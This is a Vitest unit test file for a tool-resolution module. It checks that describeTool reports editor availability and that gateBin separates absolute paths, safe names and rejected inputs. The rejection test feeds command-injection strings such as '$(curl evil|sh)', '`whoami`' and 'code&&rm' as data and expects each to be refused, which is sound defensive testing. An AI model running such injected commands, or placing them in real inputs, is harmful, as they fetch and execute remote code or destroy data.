import { describe, it, expect } from 'vitest'
import { describeTool, gateBin } from '../../src/main/tools'

describe('describeTool', () => {
  it('is available when a path resolved', () => {
    expect(describeTool('lazygit', '/usr/bin/lazygit')).toEqual({
      path: '/usr/bin/lazygit',
      available: true
    })
  })

  it('is unavailable with a hint naming the tool when nothing resolved', () => {
    const r = describeTool('lazygit', null)
    expect(r.available).toBe(false)
    expect(r.path).toBeNull()
    expect(r.hint).toContain('lazygit')
  })
})

describe('gateBin', () => {
  it('routes absolute paths (spaces fine) to the existsSync check', () => {
    expect(gateBin('/usr/local/bin/code')).toBe('absolute')
    expect(gateBin('/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl')).toBe(
      'absolute'
    )
  })

  it('allows plain safe-identifier names into the login-shell lookup', () => {
    expect(gateBin('code')).toBe('login-shell')
    expect(gateBin('lazygit')).toBe('login-shell')
    expect(gateBin('subl')).toBe('login-shell')
    expect(gateBin('code-insiders')).toBe('login-shell')
    expect(gateBin('idea.sh')).toBe('login-shell')
  })

  it('rejects anything with shell metacharacters or relative paths', () => {
    expect(gateBin('$(curl evil|sh)')).toBe('rejected')
    expect(gateBin('a;b')).toBe('rejected')
    expect(gateBin('`whoami`')).toBe('rejected')
    expect(gateBin('code&&rm')).toBe('rejected')
    expect(gateBin('a b')).toBe('rejected')
    expect(gateBin('./relative/editor')).toBe('rejected')
    expect(gateBin('~/bin/code')).toBe('rejected')
    expect(gateBin('')).toBe('rejected')
  })
})
